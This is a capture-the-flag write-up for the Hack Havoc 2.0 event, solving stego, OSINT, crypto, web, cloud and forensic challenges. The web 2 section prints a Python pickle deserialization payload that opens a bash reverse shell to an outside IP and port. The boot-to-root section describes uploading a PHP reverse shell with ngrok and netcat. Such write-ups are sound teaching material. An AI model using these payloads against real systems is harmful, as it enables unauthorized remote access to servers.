---
title: "Hack Havoc 2.0 CTF 2024"
subtitle: "CyberMaterialHavoc"
date: "2024-10-27"
views: 237
---
# Bonus
![Images](image/havoc_image/1.png)

Alright, CyberWarrior, welcome to **Hack Havoc 2.0**—CyberMaterial’s premier CTF event! 🕹️🌐 Before we dive into the real challenges, we’re making a quick pit stop to connect with our allies on Discord and Instagram. Why? Because every adventurer needs a squad, right? 🤜🤛

**Step 1**: Head over to the **Discord server** and keep an eye out for a message or hint from the bot. It’s holding one half of the flag, so watch carefully!
### First Half

![Images](image/havoc_image/3.png)

**Step 2**: Pop onto **Instagram** and grab the other half of the flag hidden in their  bio. With both pieces, you're ready to piece together the final flag.
### Second Half
![Images](image/havoc_image/2.png)


```bash
CM{w3lc0m3_t0_H4ac_H4voc}
```

# Mobile
![Images](image/havoc_image/4.png)

**Welcome to the APK-ocalypse!** 🕵️‍♂️💣 Ready to crack open this APK and uncover its hidden wonders? Could be anything—maybe memes, secret codes, or a treasure trove of cat videos! Let’s dive in and see what mysteries await! 😼💻

**Step 1**: Download the APK and fire up your favorite decompiler. If you’re rolling old school, try **JADX** (grab it [here](https://github.com/skylot/jadx/releases/tag/v1.5.0)) or for a quick fix, check out [decompiler.com](https://www.decompiler.com/). We’re going to tear this APK apart!

![Images](image/havoc_image/5.png)

**Step 2**: Once inside, if you know your way around Android apps, you know to start with the **AndroidManifest.xml** file—it’s the heart of every APK. And guess what? There it is—a sneaky string in the flag format, hidden right in plain sight!

![Images](image/havoc_image/6.png)

**Step 3**: Now, time to decode! The letters are shifted, and it’s giving off major **Caesar cipher vibes**. I hopped over to [Cryptii](https://cryptii.com/pipes/caesar-cipher), tried out different shifts, and—bingo—13 was the magic number! With that, the flag popped right out.

```bash
CM{H1dd3n_7L4g_1n_M4nIF35T}
```


# Stego

## Stego 1

![Images](image/havoc_image/7.png)

we’re about to play detective between the "incidents of May and June" to uncover the flag lurking in the pixels. Let's get ready to rock this steganography adventure!

![Images](image/havoc_image/8.png)

First thing’s first, we pop open the JPG file. A quick check of the metadata... but there’s nothing to see here. Suspiciously blank, almost like it’s daring us to dig deeper. So we dive into the file using Notepad, just in case there's hidden text in the raw data.

![Images](image/havoc_image/9.png)


 Turns out, this file is password-protected! Enter **rockyou.txt**, the brute-force champion. We spin up **stegcracker** to break open the secrets, but no luck. The file's keeping its secrets locked up tight. A new hint arrives! 🤔 We need to filter rockyou.txt for passwords containing “amos.”
 
```bash
cat rockyou.txt | grep 'amos' > amos_rockyou.txt
```

![Images](image/havoc_image/10.png)

This creates a custom list to try again.

One last attempt with the final password on our filtered list... and _boom_! 🎉 The flag reveals itself in all its glory:

![Images](image/havoc_image/11.png)

```bash
CM{Bru73_f0rc3_i5_b35t}
```

## Stego 2

![Images](image/havoc_image/44.png)

Upon exploring the website, I came across numerous pages filled with images. I decided to download each one, ending up with a total of 10 images.


![Images](image/havoc_image/26.png)


i tried to use steghide on every image and i got the first flag from  1 image 

![Images](image/havoc_image/25.png)

I saved this flag fragment and created a “wordlist” from it, suspecting it might serve as a **key to unlock additional images**.

Wordlist:

![Images](image/havoc_image/38.png)


```bash
stegcracker 2.jpg wordlist.txt
```

and i got this ouput:

![Images](image/havoc_image/42.png)

I took this and add to my wordlists, After tried at every image i  got this:

![Images](image/havoc_image/43.png)

When processing `9.jpg`, the result led me to a link: [https://pastebin.com/V3nbr0sm](https://pastebin.com/V3nbr0sm), revealing yet another segment of the flag.

![Images](image/havoc_image/27.png)

and final i got 4 part also :

![Images](image/havoc_image/40.png)

Now let assembly it :
![Images](image/havoc_image/28.png)

Now 4 and 5 part only remain, after seeing the image i got the hint to combine the image and then  i got the 5 part also 
![Images](image/havoc_image/14.png)

```bash
CM{{Break_1t_1int0_#_p13ces}
```

Now from the from the 10.jpg.out we got a poem:

```bash
"In the realm of shapes, I’m the base of a square
In the world of shapes, I form a perfect square,
A hint lies in balance; I help you explore,
Count me well, and you’ll see I am more.
I'm just a single digit number, all alone."
```
From the flag structed we now that # represent number so i assume that it should be 4 because the square has 4 side and it tired it and it work i got the point

```bash
CM{{Break_1t_1int0_4_p13ces}
```

# OSINT
## OSINT 1
![Images](image/havoc_image/16.png)

Here we have to create a flag and from the hint we got that there is a pdf that information about july 2024 incident/alerts so first i tried to search in there linkedin and i got the document

![Images](image/havoc_image/17.png)

From this info we got our flag

```bash
CM{DarkGate_CVE-2024-5217_KOPSA}
```


## OSINT 2


![Images](image/havoc_image/18.png)

The text they have given here i tried the same way and search in linkedin and i got this post 

![Images](image/havoc_image/19.png)

Here the flag :

![Images](image/havoc_image/20.png)


```bash
CM{H4LL_of_H4ck5_Thr3aTs}
```


# REV

![Images](image/havoc_image/21.png)

This was the hardest one among every ctf and i got stuck here for few days but from the hint we got the rotors, position, Reflector and Plugboard because they lower ctf level of this one and it has become easier 

Flag:

```bash
CM{Rotor_I-II-III_Pos_A-B-C_Reflector_B_Plug_A-T_B-L_Ring_A-A-A} 
```


# Misc

![Images](image/havoc_image/22.png)

here we got dat file, let open it.

![Images](image/havoc_image/37.png)

It contain the svg data let open an online svg viewer on [svgviewer](www.svgviewer.dev):

after viewing we got qr code:

![Images](image/havoc_image/23.png)

There is error in the qr code so i used chatgpt to correct and here the svg code:

```bash
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300" viewBox="0 0 27 27">
  <path d="M1 1h7v7H1zM9 1h1v2h1v1h1v4h1v1h-1v1h-1v-3h-1v1h-1v-2h1v-1h-1zM14 1h1v1h-1zM16 1h2v1h-2zM19 1h7v7h-7zM2 2v5h5v-5zM12 2h2v2h1v-2h1v1h1v3h-1v-1h-2v1h-1v-3h-1zM20 2v5h5v-5zM3 3h3v3H3zM21 3h3v3h-3zM14 6h2v3h-1v-2h-1zM17 6h1v4h-1zM13 7h1v1h-1zM1 9h2v1H2v1h1v1H2v1H1zM5 9h3v1H5zM13 9h1v1h-1zM20 9h1v1h-1zM22 9h4v1h-1v1h-2v-1h-1zM3 10h1v1H3zM8 10h1v2H7v-1h1zM16 10h1v2h-1v1h4v1h-2v1h-1v-1h-1v1h1v1h-2v2h2v-2h1v1h1v-1h2v-1h-1v-1h3v2h1v2h-2v1h2v1h1v1h1v2h-1v2h1v1h-6v-1h-1v-1h1v-1h-2v-1h-1v-3h-3v-1h-1v-1h1v-1h-1v1h-1v-1h-1v-2h1v1h1v-1h1v1h1v-1h-1v-1h1v-2h1zM21 10h1v2h-4v-1h3zM4 11h2v1h1v1h-1v1h1v1h-1v1h1v1h2v1H7v-1H6v-5H5zM10 11h2v1h-1v1h-1v1H9v1H8v-1h-1v-1h2v-1h1zM3 12h1v1H3zM13 12h1v1h-1zM23 12h1v1h-1zM2 13h1v1H2zM12 13h1v1h-1zM24 13h1v1h-1zM1 14h1v1H1zM25 14h1v1h-1zM7 15h1v1H7zM9 15h1v1H9zM18 15h1v1h-1zM3 16h1v1h1v1H1v-1h2zM10 16h1v3H9v-1h1zM25 16h1v3h-1zM18 18v3h3v-3zM1 19h7v7H1zM19 19h1v1h-1zM2 20v5h5v-5zM9 20h3v1h1v1h-2v1h2v-1h1v1h2v-1h1v1h1v1h-3v2h-2v-1h1v-1h-1v1H9v1H8v-2h1v-2H8zM13 20h1v1h-1zM15 20h1v2h-2v-1h1zM22 20v1h1v-1zM3 21h3v3H3zM21 22v2h1v-1h1v1h1v-2zM18 25h1v1h-1z"/>
</svg> 
```

and we  got the flag:
![Images](image/havoc_image/24.jpeg)


# Web
## web 1

![Images](image/havoc_image/41.png)


From the site first i open the robots.txt because it so common to find hint there in any ctf 
![Images](image/havoc_image/36.png)

First i thought that we have to change the user-agent when sending the request and after tried every possible way then again i open this and find that there is more that it mate the eye. 

![Images](image/havoc_image/65.png)
i got the hash and from the hint, i get to now that i have to use combination of extenstion and hash

![Images](image/havoc_image/29.png)

and i got this flag

```bash
 CM{3xten5i0n5_w45_CR4zY}
```



## web 2
![Images](image/havoc_image/30.png)



From the name of the Challenge name we get the idea that we have to manipulated the cookie and from the text we got that there is deserialization vulnerability . so i tried to google it and find this **CVE-2022-34668** . And i get to know we can to this using pickle so i search how to escalate this in youtube and i got this video:
https://www.youtube.com/watch?v=qt15PnF8x-M

and from this i created my code 

```bash
##Define a class for malicious deserialization
class anti_pickle_serum(object):
    def _reduce_(self):
        # This is where the reverse shell command will be executed
        return subprocess.Popen, (["/bin/bash", "-c", "bash -i >& /dev/tcp/13.127.206.16/15704 0>&1"],)

##Serialize the payload and encode it
pickled = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
encoded_pickled = b64encode(pickled)

##Print the base64 encoded malicious payload
print(encoded_pickled.decode())
```


###   Steps of Exploitation
- Setup The Environment,
	- Start the `NGROK Server`
     - Start the `Ncat Server`
     - Prepare a `Reverse Shell Payload` to Put in Script
- Creating the Payload Using Above Script
 - Add Any Item in Cart
- Go to Cart Section
- Open up the Storage  Section Inspect
- `Replace the Malicious Cookie` and `Just Refresh` and  Got a Shell 🤯

![Images](image/havoc_image/31.png)

```bash
CM{c0Ngr47S_y0u_ArE_A_Ser1A1_KI11er}
```


## Web 3
![Images](image/havoc_image/32.png)

From this site we got two link one is form where we have to hash and second link of Unscramble this 742-AJM , here we also got and img let use steghide 

![Images](image/havoc_image/33.png)


From this we got a python code:

```bash
you are tasked with securing a sensitive file. To ensure its integrity, you must calculate the SHA-256 hash of the file contents. 

	import hashlib
	
	###Calculate the value of the mathematical expression
	value = (5 * eight) + (three * 6) - (two * 4)
	
	###Convert the value to a string
	value_str = str(value)
	
	###Calculate the SHA-256 hash
	hash_object = hashlib.sha256(value_str.encode())
	hash_hex = hash_object.hexdigest()
	
	print(hash_hex)


Once you have calculated the value of this expression, hash the resulting string using the SHA-256 algorithm. What is the hash? 
```


```bash
Output: 1a6562590ef19d1045d06c4055742d38288e9e6dcd71ccde5cee80f1d5a774eb
```

![Images](image/havoc_image/39.png)

Let go to the website link  and get the flag:

![Images](image/havoc_image/34.png)

From the previous code we the mathematical expression:
- $value = (5 * eight) + (three * 6) - (two * 4)$
- $eight = 8, three = 3, two = 2$
- $(5 * 8) + (3 * 6) - (2 * 4)$
- $40 + 18 - 8 = 50$

So the Flag is 

```bash
CM{SHA-256_50}`
```


# Boot-to-Root
![Images](image/havoc_image/56.png)


Alright, hackers and hustlers, welcome to **Hacker’s Fortress**—a boot-to-root mission straight outta DarkUnic0rn’s playbook! 🦄💻 We’re diving into this fortress with one goal: uncover that hidden flag. The target? A server ripe for a little unauthorized snooping. Let’s roll! 🚀

First thing’s first: I hit up the website at [35.208.110.64](http://35.208.110.64), and it’s all clean and shiny—a basic PHP site with a login and registration form. No red flags…yet. So, I register and log in, thinking, “Alright, let’s see what we’re dealing with.”

![Images](image/havoc_image/57.png)

Then, boom—a file upload feature. You already know what time it is! I start with the classic trick every hacker tries at first: uploading a sneaky little PHP shell. _"Will they fall for the ol’ PHP payload?"_ 😏 I fire up **ngrok** and **netcat** on my end, tweaking the famous PentestMonkey payload to match my setup.

![Images](image/havoc_image/58.png)
Once everything’s prepped, I upload the shell, manually check the `uploads/` directory (because why not?), and _bingo_—it’s there!

![Images](image/havoc_image/59.png)

The shell is uploaded, my reverse shell is ready to connect, and with a click, I’m in the server like it’s my own backyard. 🏠

![Images](image/havoc_image/60.png)

Now it’s time for a little virtual house tour! I snoop around, bouncing between directories, looking for anything that screams “FLAG HERE.” Eventually, I make my way to the `/var/www/html/uploads/1087/` directory. Nothing obvious—so I try an `ls -la`, and _ding ding ding!_ There it is, hiding like a shy little prize in the shadows.

![Images](image/havoc_image/61.png)

```bash
CTF{3sc4l4t3d_t0_r00t}
```


# crypto

## crypto 1
![Images](image/havoc_image/50.png)

I’m staring at this mysterious mess of symbols `{╵⸍⸝╮ᛁ⸌ᛁ╵╵_◟╮ᛁ⸜╵_ᛙ╮ᚽ⸝◟ᛍ}`, and I'm like, "What in the hackerverse is going on here?!" Naturally, I hit up Google like any seasoned hacker would. 
After a deep dive, I realize this isn’t just random gibberish—it’s a straight-up rune cipher!

Off to the [Valhyr Rune Translator](https://valhyr.com/pages/rune-translator) I go, feeling like a mythical codebreaker. I feed in these cryptic symbols, and voilà, out comes the message hiding in plain sight.  After all that mystery, here’s what I found:

**Flag: CM{stauiliss_ruins_muharg}**


## crypto 2

![Images](image/havoc_image/51.png)

Alright, CybermaterialHavoc, time to work some magic on this cipher chaos! 🧙‍♂️🔥 So, I’m staring at this jumble of symbols: `AgTIEe5hQ?T5,W.GDyv^N*eRcDuEoizyHNSTN&b$$4m0o9gWL!S\u+^T;/o5m/9YL@HQlje}` and my first thought? “What kinda cryptic rollercoaster is this?”

But no worries—I hop over to my trusty sidekick, [dCode](https://www.dcode.fr/cipher-identifier), aka the crypto detective’s BFF. I run it through the cipher identifier, and BOOM: it’s **Base92 Encoding**! 

![Images](image/havoc_image/52.png)

I decode that beast and get… 

```bash
ZL{YfphiGdxdicgo_Yzkqu'i_Cmtg_Qfpdiscxawtiz_Xdxl_Khdxcltu}
```

well, another heap of code. But it looks familiar, so I run it through dCode’s ID tool again. Turns out it’s a **Vigenère cipher**, but I need a key.

Looking around for clues, I spot “CybermaterialHavoc” staring me in the face, no spaces, no chill. Could it be? I plug it in, and bam—it’s the right key! Out pops this:

![Images](image/havoc_image/53.png)

```bash
XN{XbyviNzgvirzo_Dliow'h_Yvhg_Xbyvihvxfirgb_Wzgz_Kozgulin}
```

But hold up, we’re not done yet! I run another cipher ID, and voilà—it’s **Atbash Cipher**. After one final flip, I get the ultimate answer:

```bash
CM{CyberMaterial_World's_Best_Cybersecurity_Data_Platform}
```


# Cloud
![Images](image/havoc_image/47.png)

From the website we didn't get any use full information, So I try to do something that is very straight forward and that any lame hacker thinks like. I have a domain, so I have tried to see a DNS lookup and DNS records on this website: [https://dnschecker.org/](https://dnschecker.org/)
![Images](image/havoc_image/48.png)

after opening the link. we got 3 files given here 

![Images](image/havoc_image/49.png)

After opening this by appending the name in same url, I got the flag in **Hall_of_Hacks_2.pdf**


```bash
CM{GCP_CloudStorage_Bucket_Challenge_20241018}
```



# Forensic

## Forensic 1
![Images](image/havoc_image/35.png)


First up, we have our QR code image, looking all fuzzy and pixelated. No worries! We’re going to work some magic using **Canva** to sharpen it up. A little editing goes a long way!

![Images](image/havoc_image/62.png)

After giving it a snazzy makeover, it’s time to pull out our trusty phone and scan that freshly sharpened QR code. And voilà! The moment of truth—scanning the code reveals the flag we’ve been hunting for!


![Images](image/havoc_image/64.png)

``` plaintext
flag{3efd4bd34663e618c70e051505c83f9f}
```
## Forensic 2

![Images](image/havoc_image/54.png)

So, I get my hands on this file, and what’s inside? Just a bunch of random numbers staring back at me like some retro puzzle:

```bash
4 666 555 3 33 66 0 4 2 8 33 0 22 777 444 3 4 33
```

First thought? "Uh, this looks like something from an ancient brick phone...maybe our criminals here are straight outta the 90s!" So naturally, I go to [dCode](https://www.dcode.fr/cipher-identifier), aka the decoder’s paradise. Turns out, it’s **Multi-Tap Phone (SMS) Encoding**—that old-school texting method where you have to hit each button a million times to get one letter. Classic criminal move, right?

![Images](image/havoc_image/55.png)

I crack the code, and out come three clues that, together, reveal the exact spot of their next scheme. And just like that, we’ve got the flag ready to go:

```bash
CM{GOLDEN_GATE_BRIDGE}
```


Boom! Case closed, and just in time! 😎 




